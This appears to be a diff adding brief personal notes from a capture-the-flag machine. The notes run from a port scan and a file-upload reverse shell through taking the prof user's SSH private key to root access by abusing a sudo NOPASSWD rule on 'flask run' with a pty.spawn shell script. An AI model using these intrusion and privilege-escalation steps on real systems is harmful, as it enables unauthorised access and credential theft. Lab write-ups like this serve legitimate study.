@@ -1,0 +1,42 @@
+rustscan -a <ip>
+
+	port 22,5001
+	
+	5001 => homework
+
+
+tells you to upload file 
+
+		5001/tcp open  http    Gunicorn 19.7.1
+|_http-server-header: gunicorn/19.7.1
+|_http-title: Homepage
+
+
+dir brute gives /submit it only accepts .hs files ie rev shells
+
+upload and you get a rev shell as flask
+	
+	check /home/prof.ssh and it has hois id_rsa 
+
+log in as prof 
+
+check sudo -l
+ and i can run 
+		(root) NOPASSWD: /usr/bin/flask run
+
+trying to run it gives error 
+	
+		Error: Could not locate Flask application. You did not provide the FLASK_APP environment variable.  (check why this error occured) lol
+
+ create a file to get rev shell
+		
+			echo  "import pty; pty.spawn('/bin/sh')" > root.py
+
+			export FLASK_APP=root.py
+			
+			sudo /usr/bin/flask run
+				
+			# whoami
+			  root
+
+
